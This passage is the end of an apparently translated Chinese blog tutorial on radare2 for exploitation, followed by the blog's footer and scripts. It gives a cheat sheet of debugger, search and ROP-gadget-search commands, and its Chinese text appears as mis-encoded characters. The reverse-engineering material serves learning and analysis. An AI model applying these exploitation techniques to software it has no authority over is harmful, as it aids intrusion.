<li><code>dmm</code>â€”â€”åˆ—å‡ºæ¨¡å—ï¼ˆå†…å­˜ä¸­çš„è¿è¡Œåº“å’ŒäºŒè¿›åˆ¶æ¨¡å—ï¼‰</li>
<li><code>dmi [addr|libname] [symname]</code>â€”â€”åˆ—å‡ºç›®æ ‡åº“çš„æ ‡å¿—</li>
</ul>
<h2 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h2><ul>
<li><code>e search.*</code>â€”â€”ç¼–è¾‘æŸ¥æ‰¾é…ç½®</li>
<li><code>/?</code>â€”â€”åˆ—å‡ºæŸ¥æ‰¾çš„å­å‘½ä»¤</li>
<li><code>/ string</code>â€”â€”åœ¨å†…å­˜æˆ–ç¨‹åºæ®µæŸ¥æ‰¾å­—ç¬¦ä¸²</li>
<li><code>/R [?]</code>â€”â€”æŸ¥æ‰¾ç‰¹å®šçš„ ROP</li>
<li><code>/R/</code>â€”â€”ROP å¸¸è§„æœç´¢</li>
</ul>
<h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><ul>
<li><code>dc</code>â€”â€”ç»§ç»­æ‰§è¡Œ</li>
<li><code>dcu addr</code>â€”â€”ç»§ç»­æ‰§è¡Œåˆ°æŸä¸ªåœ°å€</li>
<li><code>dcr</code>â€”â€”ç»§ç»­æ‰§è¡Œç›´åˆ°<code>ret</code>ï¼ˆå•æ­¥æ­¥è¿‡ï¼‰</li>
<li><code>dbt [?]</code>â€”â€”åœ¨<em>dbg.btdepth</em>å’Œ<em>dbg.btalgo</em>çš„åŸºç¡€ä¸Šå›æº¯æŒ‡ä»¤</li>
<li><code>doo [args]</code>â€”â€”é‡æ–°æ‰“å¼€è°ƒè¯•å¹¶è®¾ç½®å‚æ•°</li>
<li><code>ds</code>â€”â€”å•æ­¥æ­¥å…¥</li>
<li><code>dso</code>â€”â€”å•æ­¥æ­¥è¿‡</li>
</ul>
<h2 id="å›¾å½¢æ¨¡å¼"><a href="#å›¾å½¢æ¨¡å¼" class="headerlink" title="å›¾å½¢æ¨¡å¼"></a>å›¾å½¢æ¨¡å¼</h2><ul>
<li><code>pdf @ addr</code>â€”â€”è¾“å‡ºå½“å‰ä½ç§»ä¸‹å‡½æ•°çš„æ±‡ç¼–ä»£ç </li>
<li><code>V</code>â€”â€”å¯è§†åŒ–æ¨¡å¼ï¼Œä½¿ç”¨<code>p</code>/<code>P</code>å†ä¸¤ä¸ªæ¨¡å¼é—´åˆ‡æ¢</li>
<li><code>VV</code>â€”â€”å›¾å½¢æ¨¡å¼ï¼Œåœ¨ ascii å›¾åƒä¸‹åˆ†æ</li>
<li><code>V!</code>â€”â€”æ§åˆ¶æ¿æ¨¡å¼ï¼Œå¯¹æ¼æ´åˆ©ç”¨éå¸¸æœ‰ç”¨</li>
</ul>
<p>çœ‹çœ‹<a href="http://radare.today/posts/using-radare2/" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a>ï¼Œä¹Ÿè®¸æœ‰æ›´å¤šçš„å†…å®¹èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚</p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/re/">re</a>
                    
                      <a class="hover-with-bg" href="/tags/translation/">translation</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0åè®®</a> ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2019/03/02/Shellcode-Tricks/">
                        <i class="fa fa-chevron-left"></i>
                        <span>Shellcode Tricks</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2019/02/21/2019æ˜¥èŠ‚-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨/">
                        <span>2019æ˜¥èŠ‚-å¾çˆ±ç ´è§£è§£é¢˜é¢†çº¢åŒ…æ´»åŠ¨</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- ä¸è’œå­ç»Ÿè®¡PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      æ€»è®¿é—®é‡ <span id="busuanzi_value_site_pv"></span> æ¬¡
    </span>
    
    
      <!-- ä¸è’œå­ç»Ÿè®¡UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      æ€»è®¿å®¢æ•° <span id="busuanzi_value_site_uv"></span> äºº
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
